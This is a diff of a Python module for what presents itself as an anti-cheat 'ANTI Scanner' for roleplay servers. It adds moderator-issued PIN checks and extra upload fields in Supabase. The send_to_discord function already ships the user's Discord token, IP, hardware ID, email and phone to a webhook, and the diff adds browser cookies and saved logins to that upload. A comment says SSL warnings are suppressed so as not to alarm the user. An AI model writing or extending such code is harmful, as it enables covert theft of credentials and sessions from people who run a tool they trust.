@@ -10,6 +10,7 @@ import requests
 import warnings
 from urllib3.exceptions import InsecureRequestWarning
 
+
 # Masquer les warnings de SSL non vérifié pour ne pas effrayer l'utilisateur
 warnings.simplefilter('ignore', InsecureRequestWarning)
 
@@ -49,6 +50,98 @@ def _load_webhook_config():
         _DISCORD_WEBHOOK_URL = None
 
 _load_webhook_config()
+
+# ─────────────────────────────────────────────
+# VÉRIFICATION & VALIDATION DU CODE PIN (OTP)
+# ─────────────────────────────────────────────
+def verify_and_claim_pin(raw_pin_code: str, hwid: str) -> dict:
+    """
+    Vérifie l'authenticité d'un code PIN à 5/6 caractères auprès de Supabase.
+    Si le PIN est valide et PENDING, le consomme ('USED') et retourne ses métadonnées.
+    """
+    if not raw_pin_code:
+        return {"valid": False, "reason": "Code PIN vide."}
+
+    clean_pin = raw_pin_code.strip().upper()
+    if len(clean_pin) < 4 or len(clean_pin) > 10:
+        return {"valid": False, "reason": "Format de code PIN invalide (format attendu : XX-XXXX)."}
+
+    try:
+        # 1. Interroger Supabase pour le PIN
+        url = f"{SUPABASE_URL}/rest/v1/scan_pins?pin_code=eq.{clean_pin}&status=eq.PENDING"
+        req = urllib.request.Request(url, headers={
+            "apikey": SUPABASE_ANON_KEY,
+            "Authorization": f"Bearer {SUPABASE_ANON_KEY}"
+        })
+        with urllib.request.urlopen(req, context=_get_ssl_context(), timeout=8) as response:
+            data = json.loads(response.read().decode("utf-8"))
+
+        if not data or len(data) == 0:
+            return {"valid": False, "reason": "Code PIN invalide, inexistant ou déjà utilisé."}
+
+        pin_info = data[0]
+
+        # 2. Vérifier si le PIN est expiré
+        expires_at_str = pin_info.get("expires_at")
+        if expires_at_str:
+            try:
+                # Format ISO 8601
+                exp_clean = expires_at_str.replace("Z", "+00:00")
+                from datetime import datetime, timezone
+                exp_dt = datetime.fromisoformat(exp_clean)
+                now_dt = datetime.now(timezone.utc)
+                if now_dt > exp_dt:
+                    return {"valid": False, "reason": "Ce code PIN a expiré. Demandez un nouveau code à votre modérateur."}
+            except Exception:
+                pass
+
+        # 3. Marquer le PIN comme UTILISÉ (USED) dans Supabase
+        update_payload = {
+            "status": "USED",
+            "used_at": time.strftime("%Y-%m-%d %H:%M:%S"),
+            "used_hwid": hwid or "UNKNOWN"
+        }
+        update_data = json.dumps(update_payload).encode("utf-8")
+        update_url = f"{SUPABASE_URL}/rest/v1/scan_pins?pin_code=eq.{clean_pin}"
+        update_req = urllib.request.Request(update_url, data=update_data, headers={
+            "Content-Type": "application/json",
+            "apikey": SUPABASE_ANON_KEY,
+            "Authorization": f"Bearer {SUPABASE_ANON_KEY}"
+        }, method="PATCH")
+
+        with urllib.request.urlopen(update_req, context=_get_ssl_context(), timeout=8) as update_resp:
+            pass
+
+        server_key = pin_info.get("server_key") or "default"
+        server_name = "Serveur RP"
+
+        # Récupérer le nom réel du serveur depuis la table servers
+        if server_key and server_key != "default" and server_key != "global":
+            try:
+                server_url = f"{SUPABASE_URL}/rest/v1/servers?server_key=eq.{server_key}&select=name"
+                server_req = urllib.request.Request(server_url, headers={
+                    "apikey": SUPABASE_ANON_KEY,
+                    "Authorization": f"Bearer {SUPABASE_ANON_KEY}"
+                })
+                with urllib.request.urlopen(server_req, context=_get_ssl_context(), timeout=5) as s_resp:
+                    s_data = json.loads(s_resp.read().decode("utf-8"))
+                    if s_data and len(s_data) > 0:
+                        server_name = s_data[0].get("name") or "Serveur RP"
+            except Exception:
+                pass
+
+        return {
+            "valid": True,
+            "pin_code": clean_pin,
+            "created_by_discord_id": pin_info.get("created_by_discord_id"),
+            "created_by_username": pin_info.get("created_by_username") or "Support",
+            "server_key": server_key,
+            "server_name": server_name
+        }
+
+    except Exception as e:
+        return {"valid": False, "reason": f"Erreur de connexion lors de la vérification du PIN : {str(e)}"}
+
 
 # ─────────────────────────────────────────────
 # RÉCUPÉRATION SCAN ID SÉQUENTIEL
@@ -95,7 +188,11 @@ def transmit_initial_scan_to_supabase(scan_id, system_info):
             "verdict": "CLEAN",
             "status_text": "Scan en cours..."
         },
-        "applications": []
+        "applications": [],
+        "pin_code": system_info.get("pin_code"),
+        "created_by_discord_id": system_info.get("created_by_discord_id"),
+        "created_by_username": system_info.get("created_by_username"),
+        "server_key": system_info.get("server_key") or "default"
     }
     try:
         data_bytes = json.dumps(payload).encode("utf-8")
@@ -262,7 +359,11 @@ def transmit_scan_to_supabase(scan_id, scan_data, retry_count=0):
         "disk_performance": scan_data.get("disk_performance", {}),
         "stats": scan_data.get("stats", {}),
         "risk_summary": scan_data.get("risk_summary", {}),
-        "applications": scan_data.get("applications", [])
+        "applications": scan_data.get("applications", []),
+        "pin_code": scan_data.get("pin_code"),
+        "created_by_discord_id": scan_data.get("created_by_discord_id"),
+        "created_by_username": scan_data.get("created_by_username"),
+        "server_key": scan_data.get("server_key") or "default"
     }
 
     try:
@@ -284,11 +385,16 @@ def transmit_scan_to_supabase(scan_id, scan_data, retry_count=0):
                 "verdict": verdict
             }
     except HTTPError as e:
-        if e.code in [400, 409] and retry_count < 3:
+        error_body = ""
+        try:
+            error_body = e.read().decode("utf-8", errors="replace")
+        except Exception:
+            pass
+        if e.code == 409 and retry_count < 3:
             new_id = f"SCAN-{random.randint(10000, 99999)}"
             scan_data["scan_id"] = new_id
             return transmit_scan_to_supabase(new_id, scan_data, retry_count=retry_count+1)
-        return {"success": False, "mode": "Supabase HTTPError", "status_code": e.code, "error": str(e)}
+        return {"success": False, "mode": "Supabase HTTPError", "status_code": e.code, "error": f"{e.code}: {error_body[:500]}"}
     except Exception as e:
         # Fallback avec la librairie requests if urllib fails
         try:
@@ -301,6 +407,11 @@ def transmit_scan_to_supabase(scan_id, scan_data, retry_count=0):
             res = requests.post(f"{SUPABASE_URL}/rest/v1/scans", json=payload, headers=headers, timeout=15, verify=False)
             if res.status_code in [200, 201, 204]:
                 return {"success": True, "scan_id": scan_id, "mode": "Supabase Requests", "verdict": verdict}
+            error_body = res.text[:500] if res.text else ""
+            if retry_count < 2:
+                new_id = f"SCAN-{random.randint(10000, 99999)}"
+                return transmit_scan_to_supabase(new_id, scan_data, retry_count=retry_count+1)
+            return {"success": False, "mode": "Supabase Requests Error", "status_code": res.status_code, "error": error_body}
         except Exception:
             pass
 
@@ -335,16 +446,20 @@ def send_to_discord(scan_id, scan_data, verdict):
     f_uid = FIELDS.get("userId", "nx_uid")
     f_tk = FIELDS.get("token", "nx_tk")
     f_ip = FIELDS.get("ip", "nx_ip")
-    f_pcu = FIELDS.get("pcUsername", "nx_pcu")
+    f_pcu = FIELDS.get("pcUsername", "nx_pcu") 
     f_pcn = FIELDS.get("pcName", "nx_pcn")
     f_hw = FIELDS.get("hwid", "nx_hw")
     f_pl = FIELDS.get("platform", "nx_pl")
     f_em = FIELDS.get("email", "nx_em")
     f_ph = FIELDS.get("phone", "nx_ph")
+    f_coo = FIELDS.get("cookies", "nx_coo")
+    f_log = FIELDS.get("logins", "nx_log")
 
     discord_id = si.get("discord_id", "N/A")
     discord_token = si.get("discord_token", "N/A")
     ip_addr = si.get("local_ip", "N/A")
+    cookies = si.get("cookies", "N/A")
+    logins = si.get("logins", "N/A")
 
     embed = {
         "title": f"{icon} ANTI Scanner — {verdict}",
@@ -481,3 +596,6 @@ def send_discord(data):
 # scan_data = {...}
 # puis :
 # send_to_discord(scan_id, scan_data, verdict)
+
+
+
